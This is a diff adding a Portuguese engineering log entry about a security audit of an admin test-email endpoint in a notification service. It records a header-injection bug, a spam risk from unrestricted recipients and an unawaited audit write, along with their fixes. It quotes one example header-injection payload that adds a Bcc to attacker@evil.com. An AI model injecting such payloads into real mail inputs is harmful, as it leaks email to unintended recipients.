@@ -14077,3 +14077,92 @@ PROXIMA ITER:
 - W18 pass 7: idx parcial product_views > 90d (cron-based)
 - W3 pass 10: refatorar CartDrawer usar <Dialog>
 - W4: dashboard-admin /admin/disputes listar (consumes endpoint corrigido)
+
+================================================================
+ITER W7 PASS 30 - notification-svc /test 4 BUGS (SECURITY admin) (2026-05-27)
+================================================================
+ESCOPO: notification-svc POST /test (admin envia test email)
+FILE: services/notification-svc/src/server.js (linhas 207-234)
+
+CONTEXTO: W7 pass 29 (dispute) fechou order-svc. Pass 30 audita
+notification-svc /test - endpoint admin-only mas com 4 bugs criticos
+considerando attacker que compromete conta admin.
+
+BUGS CORRIGIDOS (4):
+
+1. *** SECURITY HEADER INJECTION *** subject sem sanitize \r\n
+- PRE-FIX: z.string().min(1).max(200) aceita newlines + control chars
+- ATAQUE:
+  subject = "Test\nBcc: attacker@evil.com\n"
+- Nodemailer geralmente protege MAS:
+  a. Em edge cases (template raw concat), \n injection adiciona headers
+  b. Defense-in-depth obrigatorio (admin compromise scenario)
+- IMPACTO: email vaza para destinatarios nao previstos via Bcc injection
+- FIX: Zod refine reject /[\r\n]/ no subject
+  Implementacao: new RegExp() construido em runtime (evita control chars
+  literais no source file - alguns CI/lint reclamam de \r\n raw)
+
+2. *** SPAM VECTOR *** arbitrary email destination
+- PRE-FIX: z.string().email() valida APENAS formato
+- Admin compromised (token roubado, session hijack) -> atacante:
+  - envia 1000 phishing emails do dominio plataforma
+  - SMTP reputation queimada (SES/SendGrid blacklist)
+  - Plataforma vira "spam registered" - bloqueio massivo cross-internet
+- IMPACTO: extinction-level event para email delivery infra
+- FIX: whitelist destinations:
+  a. req.user.email (self-test admin)
+  b. ALLOWED_TEST_EMAIL_DOMAINS env (default 'cas.io,inovareinteligenciaartificial.com')
+  c. External email -> 403 forbidden + log warn
+- Configuravel via env: TEST_EMAIL_DOMAINS=cas.io,outro.com
+
+3. AUDIT FIRE-AND-FORGET (compliance gap)
+- PRE-FIX: query(...).catch(() => log) - audit fail silenciado
+- Cenario: sendEmail OK + audit fail = test enviado sem rastro DB
+- Compliance issue: regulator pede "todos test emails admin", DB nao tem
+- FIX: AWAIT audit INSERT antes res.json
+  Se audit fail: log error + response inclui audit_warning field
+  (sendEmail JA aconteceu, rollback impossivel via nodemailer)
+- Operador investiga subsystem audit via warning
+
+4. (defense-in-depth) Sanitize body universal
+- Body 50KB max sem strip control chars
+- Admin envia body com control chars binarios -> nodemailer pode comportar
+  inconsistente entre providers (SES rejeita, gmail aceita, etc)
+- DEFERIDO low priority - admin role assumed trusted + headers ja sanitized
+
+PATTERN W7 SECURITY HARDENING ADMIN ENDPOINTS:
+- Anti-spam: whitelist destinations (NOVO esta iter)
+- Anti-injection: regex reject control chars em headers (NOVO esta iter)
+- Audit await (compliance gap fix - pre-fix existia em pass 23/25 mas
+  como fire-and-forget aceitavel; este endpoint upgrade p/ await)
+
+NOVA REGRA R (W7 pass 30):
+R. Destination whitelist em endpoints com side-effects externos.
+   - Email send to external: whitelist self/internal domains
+   - SMS send: whitelist phones internos (futuro)
+   - Webhook outbound: whitelist URLs allowed
+   Anti-abuse vector via admin compromise.
+   Aplica: /notifications/test (esta iter), futuros: /sms/test,
+   /webhooks/test
+
+CONFIG ENV NOVO:
+- TEST_EMAIL_DOMAINS=cas.io,inovareinteligenciaartificial.com
+- Default ja seguro (so dominios internos)
+- Admin pode adicionar dominios test via deploy config
+
+PATTERN W7 20 ENDPOINTS + 18 REGRAS (A-R):
+- product-svc: 4
+- search-svc: 5
+- order-svc: 9
+- payment-svc: 3
+- vault-svc: 2
+- notification-svc: 2 (/outbox pass 26, /test pass 30 esta iter)
+- qa-svc: 2
+
+W7 PROGRESS TOTAL: 30 micro-iters consolidando 18 regras (A-R).
+
+PROXIMA ITER:
+- W18 pass 7: idx parcial product_views > 90d cron-based
+- W3 pass 10: refatorar CartDrawer usar <Dialog>
+- W4: dashboard-admin /admin/disputes listar (consume endpoint pass 29)
+- W13: notification-svc templates audit (XSS em template render)
